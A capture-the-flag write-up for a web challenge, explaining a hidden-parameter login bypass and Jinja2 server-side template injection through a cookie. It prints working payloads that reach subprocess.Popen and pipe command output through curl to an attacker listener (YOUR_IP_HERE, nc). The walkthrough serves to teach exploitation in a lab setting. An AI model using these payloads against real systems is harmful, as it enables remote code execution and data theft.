# Writeup [Wizardschat](README.md)
**Points: 300**

**Author: aleksil**

**Difficulty: hard**

**Category: web**


On opening the web-page you are greeted with a "login" prompt.
Simply entering a username and pressing login results in a "NO MAGIC DETECTED" message,
the trick to bypass this is to set the hidden form parameter `has_magic` to `1` instead of `0`.

Once you've managed to log in you can send messages that are stored
in an SQLite database. This is a red herring as SQL-injection should not
be possible.

However, the username field that is stored in a cookie enables server-side template
injection (SSTI). With SSTI you can run arbitrary code on the server in a roundabout way.
To use this for actual exploitation we need to break out of the sandbox that the 
templating engine has set up.

The following HTTP call will give us a list of the classes we have available:
```
GET / HTTP/1.1
Cookie: username={% for x in [].__class__.__base__.__subclasses__() %}<pre>{{loop.index -1}} - {{x|string}}</pre>{%endfor%}
cache-control: no-cache
User-Agent: PostmanRuntime/7.6.0
Accept: */*
Host: localhost:5000
Accept-Encoding: gzip, deflate
Connection: close
```

Response:
```
Username:
0 - <class 'type'>
1 - <class 'weakref'>
2 - <class 'weakcallableproxy'>

... snip ...

180 - <class 'subprocess.CompletedProcess'>
181 - <class 'subprocess.Popen'>

... snip ...

486 - <class 'jinja2.ext.Extension'>
487 - <class 'jinja2.ext._CommentFinder'>
488 - <class 'unicodedata.UCD'>
```

`subprocess.Popen` will allow us to call arbitrary shell commands.
Using this we can pop a reverse shell and access the flag.

By sending the username as `{{[].__class__.__base__.__subclasses__()[181]("ls | curl -X POST -d @- YOUR_IP_HERE:1234",shell=True)}}`
and running `nc -l 1234` locally we can get a directory listing. 
NOTE: If you run another variant of netcat you might need a different command to make it listen on the correct port.

```
POST / HTTP/1.1
Host: 10.0.2.15:1234
User-Agent: curl/7.64.0
Accept: */*
Content-Length: 56
Content-Type: application/x-www-form-urlencoded

__pycache__flag.txtmain.pyrequirements.txtwizardschat.db
```

From this we deduce that the flag is in `flag.txt` and we can run another call to exfiltrate
it to our listening `nc`.

```
GET / HTTP/1.1
Cookie: username={{[].__class__.__base__.__subclasses__()[181]("cat flag.txt | curl -X POST -d @- YOUR_IP_HERE:1234",shell=True)}}
cache-control: no-cache
Postman-Token: f9c2c1b7-34b8-4d7e-a750-0e3b1ce301d1
User-Agent: PostmanRuntime/7.6.0
Accept: */*
Host: localhost:5000
Accept-Encoding: gzip, deflate
Connection: close
```

```
POST / HTTP/1.1
Host: 10.0.2.15:1234
User-Agent: curl/7.64.0
Accept: */*
Content-Length: 34
Content-Type: application/x-www-form-urlencoded

TG19{templates_make_a_better_chat}
```

And there's the flag! :)
